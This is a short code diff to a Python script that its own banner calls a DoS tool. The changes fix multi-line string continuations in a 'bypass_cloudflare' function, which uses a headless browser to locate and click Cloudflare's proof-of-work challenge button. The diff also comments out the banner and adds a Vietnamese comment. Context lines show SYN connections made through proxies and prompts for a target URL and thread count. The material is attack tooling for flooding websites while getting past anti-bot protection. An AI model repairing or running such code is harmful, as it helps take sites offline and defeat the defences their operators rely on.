@@ -15,16 +15,17 @@ def generate_random_payload():
     return payload
 
 async def bypass_cloudflare(page):
-    cloudflare_button = await page.evaluate('() => {
-        const button = document.querySelector(".big-button.pow-button");
-        if(button) {
-            const { x, y, width, height } = button.getBoundingClientRect();
-            return { x: x + width / 2, y: y + height / 2 };
-        } else {
-            return false;
-        }
+    cloudflare_button = await page.evaluate('() => {\
+        const button = document.querySelector(".big-button.pow-button");\
+        if(button) {\
+            const { x, y, width, height } = button.getBoundingClientRect();\
+            return { x: x + width / 2, y: y + height / 2 };\
+        } else {\
+            return false;\
+        }\
     }')
 
+    # Các phần còn lại của hàm bypass_cloudflare()
     if cloudflare_button:
         await page.hover('.big-button.pow-button')
         await page.mouse.click(cloudflare_button['x'], cloudflare_button['y'])
@@ -81,7 +82,7 @@ async def create_syn_connection(proxy):
     transport.close()
 
 async def main():
-	print("\033[92m===================\n|| \033[91mdos \033[94msiêu \033[91mlỏ, \033[0mviết bởi dragoo ||\n\033[92m===================\033[0m\n\n")
+	# print("\033[92m===================\n|| \033[91mdos \033[94msiêu \033[91mlỏ, \033[0mviết bởi dragoo ||\n\033[92m===================\033[0m\n\n")
     url = input("URL: ")
     num_threads = int(input("Number of threads: "))
 
